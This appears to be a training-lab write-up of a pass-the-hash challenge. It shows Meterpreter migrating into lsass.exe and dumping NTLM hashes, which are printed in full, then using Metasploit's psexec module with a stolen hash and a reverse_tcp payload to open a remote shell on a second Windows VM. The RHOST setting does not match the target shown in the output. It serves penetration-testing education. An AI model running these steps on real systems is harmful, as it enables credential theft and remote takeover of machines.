# **Challenge 7: Passing the Hash**
!!! note ""
## **Procedure:**

With one Windows machine down and one left to go, we can try a Pass The Hash attack.

- From your established Meterpreter session, perform a hash dump and save the results.
- Exit (or background) your Meterpreter session to get back into the main Metasploit console.
- Using the same exploit and payload modules, set your RHOSTS target to the remaining Windows server IP.
- Test each username and hash combination you found on the first Windows server until you gain a Meterpreter on the final server. 

## **Solution:**

### Runing `hashdump` from the meterpreter shell (Windows VM 172.31.43.103)

- Migrating to lsass.exe (PID:588) to perform the hashdump

```bash linenums="1" hl_lines="1 2 3 48 51-56"
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 272   4     smss.exe              x64   0
 348   580   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 352   344   csrss.exe             x64   0
 452   444   csrss.exe             x64   1
 472   344   wininit.exe           x64   0
 512   444   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 580   472   services.exe          x64   0
 588   472   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 672   580   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 728   580   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 820   512   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 828   512   dwm.exe               x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 952   580   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 960   580   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1008  580   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1016  580   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1036  580   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1164  580   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1356  580   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1656  580   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1768  580   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1836  580   dcvserver.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\NICE\DCV\Server\bin\dcvserver.exe
 1876  580   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1896  580   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1916  580   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1944  580   MsMpEng.exe           x64   0
 2544  580   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2564  1876  ssm-agent-worker.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
 2784  2564  conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3052  1836  dcvagent.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\NICE\DCV\Server\bin\dcvagent.exe
 3060  1836  dcvagent.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Program Files\NICE\DCV\Server\bin\dcvagent.exe
 3092  3144  conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3144  2488  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 3324  580   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3752  580   msdtc.exe             x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe

meterpreter > migrate 588
[*] Migrating from 3144 to 588...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa0969ce61a2e254b7fb2a44e1d5ae7a:::
Administrator2:1009:aad3b435b51404eeaad3b435b51404ee:e1342bfae5fb061c12a02caf21d3b5ab:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
fstack:1008:aad3b435b51404eeaad3b435b51404ee:0cc79cd5401055d4732c9ac4c8e0cfed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
meterpreter > 
```

### Once the first session was send to the background, another meterpreter session will be created targeting the last windows machine (Windows VM 172.31.45.94)

- Setting the options (RHOST, PAYLOAD, SMB)

```bash linenums="1" hl_lines="3 12"
msf6 > search windows/smb/psexec

Matching Modules
================

   #  Name                        Disclosure Date  Rank    Check  Description
   -  ----                        ---------------  ----    -----  -----------
   0  exploit/windows/smb/psexec  1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/psexec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator2
SMBUser => Administrator2
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:e1342bfae5fb061c12a02caf21d3b5ab
SMBPass => aad3b435b51404eeaad3b435b51404ee:e1342bfae5fb061c12a02caf21d3b5ab
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST 172.31.39.126
RHOST => 172.31.39.126
msf6 exploit(windows/smb/psexec) > run
```

- Running the `psexec` module


```bash linenums="1" hl_lines="3 12"
[*] Started reverse TCP handler on 172.31.39.126:4444 
[*] 172.31.45.94:445 - Connecting to the server...
[*] 172.31.45.94:445 - Authenticating to 172.31.45.94:445 as user 'Administrator2'...
[*] Sending stage (175686 bytes) to 172.31.45.94
[*] 172.31.45.94:445 - Selecting PowerShell target
[*] 172.31.45.94:445 - Executing the payload...
[+] 172.31.45.94:445 - Service start timed out, OK if running a command or non-service executable...
PG::Coder.new(hash) is deprecated. Please use keyword arguments instead! Called from /usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in `new'
[*] Sending stage (175686 bytes) to 172.31.45.94
[*] Meterpreter session 2 opened (172.31.39.126:4444 -> 172.31.45.94:50000) at 2024-05-08 04:27:27 +0000

meterpreter > [*] Meterpreter session 3 opened (172.31.39.126:4444 -> 172.31.45.94:50002) at 2024-05-08 04:27:28 +0000
sysinfo
Computer        : EC2AMAZ-L3OOUG8
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > 
```

### The meterpreter shell was deployed successfully in the last windows machine (Windows VM 172.31.45.94)

![alt text](images/Pasted%20image%2020240508002959.png)


<div id="disqus_thread"></div>
<script>
    /**
    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
    /*
    var disqus_config = function () {
    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://hcoco1-1.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>



!!! note ""

<div class="button-container" markdown="1">
<a href="/Career-Simulation-3/challenge_6/" class="md-button md-button--primary">Previous: Challenge 6</a>
<a href="/Career-Simulation-3/" class="md-button md-button--secondary">Home 🏠</a>
<a href="/Career-Simulation-3/report/" class="md-button md-button--primary">Next: Report</a>
</div>


